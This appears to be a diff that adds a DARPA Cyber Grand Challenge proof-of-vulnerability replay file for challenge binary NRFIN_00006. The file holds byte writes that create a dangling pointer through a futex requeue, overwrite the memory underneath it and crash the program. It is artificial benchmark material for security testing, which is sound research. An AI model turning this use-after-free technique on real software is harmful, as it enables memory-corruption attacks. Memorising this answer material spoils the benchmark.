@@ -1,0 +1,29 @@
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE pov SYSTEM "/usr/share/cgc-docs/replay.dtd">
+<pov>
+    <cbid>NRFIN_00006</cbid>
+    <replay>
+
+        <!-- reliability -->
+        <delay>100</delay>
+
+        <!-- cause dangling pointer via FUTEX_CMP_REQUEUE_PI -->
+        <write><data>\x03\x10\x01\xfe</data></write>
+
+        <!-- clobber memory underneath dangling pointer -->
+        <!-- resurse sendmsg as many times as possible -->
+        <write><data>\x03\x40\xff\x41</data></write>
+
+        <!-- attempt a list_push() which should result in a write to unmapped memory -->
+        <write><data>\x02\x00\x02</data></write>
+
+        <!-- kill all children and exit -->
+        <write><data>\x02\x80\x01</data></write>
+        <write><data>\x02\x80\x02</data></write>
+        <write><data>\x02\x80\x03</data></write>
+        <write><data>\x02\x80\x04</data></write>
+        <write><data>\x02\x80\x05</data></write>
+        <write><data>\x00</data></write>
+
+    </replay>
+</pov>
